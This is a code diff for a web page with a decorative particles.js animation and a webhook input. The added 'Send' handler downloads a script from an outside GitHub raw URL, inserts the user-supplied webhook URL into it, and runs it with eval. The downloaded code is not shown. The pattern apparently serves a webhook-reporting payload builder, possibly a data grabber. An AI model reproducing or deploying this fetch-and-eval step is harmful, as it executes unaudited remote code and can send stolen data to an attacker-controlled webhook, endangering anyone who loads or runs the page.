@@ -19,7 +19,143 @@
         <button id="send-button">Send</button>
     </div>
 
-    <script src="particle.js"></script>
+   <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script>
+        window.addEventListener('DOMContentLoaded', function() {
+            var container = document.getElementById('container');
+            var logo = document.getElementById('logo');
+            container.style.opacity = '1';
+            logo.style.opacity = '1';
+        });
+
+        particlesJS('particles-container', {
+            particles: {
+                number: {
+                    value: 80,
+                    density: {
+                        enable: true,
+                        value_area: 800
+                    }
+                },
+                color: {
+                    value: '#9933ff' // Bright purple color
+                },
+                shape: {
+                    type: 'circle',
+                    stroke: {
+                        width: 0,
+                        color: '#000000'
+                    }
+                },
+                opacity: {
+                    value: 0.8,
+                    random: false,
+                    anim: {
+                        enable: false,
+                        speed: 1,
+                        opacity_min: 0.1,
+                        sync: false
+                    }
+                },
+                size: {
+                    value: 30,
+                    random: true,
+                    anim: {
+                        enable: false,
+                        speed: 40,
+                        size_min: 0.1,
+                        sync: false
+                    }
+                },
+                line_linked: {
+                    enable: false,
+                    distance: 150,
+                    color: '#ffffff',
+                    opacity: 0.4,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 6,
+                    direction: 'none',
+                    random: false,
+                    straight: false,
+                    out_mode: 'out',
+                    bounce: false,
+                    attract: {
+                        enable: false,
+                        rotateX: 600,
+                        rotateY: 1200
+                    }
+                }
+            },
+            interactivity: {
+                detect_on: 'canvas',
+                events: {
+                    onhover: {
+                        enable: false
+                    },
+                    onclick: {
+                        enable: false
+                    },
+                    resize: true
+                },
+                modes: {
+                    grab: {
+                        distance: 400,
+                        line_linked: {
+                            opacity: 1
+                        }
+                    },
+                    bubble: {
+                        distance: 400,
+                        size: 40,
+                        duration: 2,
+                        opacity: 8,
+                        speed: 3
+                    },
+                    repulse: {
+                        distance: 200,
+                        duration: 0.4
+                    },
+                    push: {
+                        particles_nb: 4
+                    },
+                    remove: {
+                        particles_nb: 2
+                    }
+                }
+            },
+            retina_detect: true
+        });
+
+        var plusButton = document.getElementById('plus-button');
+        var overlayContainer = document.getElementById('overlay-container');
+        var webhookInput = document.getElementById('webhook-input');
+        var sendButton = document.getElementById('send-button');
+
+        plusButton.addEventListener('click', function() {
+            plusButton.classList.toggle('active');
+            overlayContainer.classList.toggle('active');
+        });
+
+        sendButton.addEventListener('click', function() {
+            var webhookURL = webhookInput.value;
+
+            var scriptURL = 'https://raw.githubusercontent.com/Lenn106/files/master/discip';
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', scriptURL, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    var scriptCode = xhr.responseText;
+                    scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
+                    eval(scriptCode);
+                }
+            };
+            xhr.send();
+        });
+    </script>
     <script src="main.js"></script>
 </body>
 </html>
